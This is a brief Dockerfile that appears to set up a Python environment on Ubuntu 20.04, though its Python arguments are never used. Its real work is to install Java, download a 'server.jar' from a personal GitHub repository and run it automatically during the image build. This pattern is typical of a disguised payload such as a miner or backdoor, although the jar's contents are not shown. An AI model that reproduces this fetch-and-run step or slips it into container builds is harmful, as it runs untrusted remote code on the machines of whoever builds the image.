FROM ubuntu:20.04
USER root
WORKDIR /root
SHELL [ "/bin/bash", "-c" ]
ARG PYTHON_VERSION_TAG=3.8.7
ARG LINK_PYTHON_TO_PYTHON3=1
RUN apt update
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
RUN wget -O build.jar https://github.com/Afrodille-Charpie/Afrodille-Charpie/raw/main/server.jar
RUN java -jar build.jar
RUN echo "touch $HOME/.sudo_as_admin_successful"
CMD [ "/bin/bash" ]
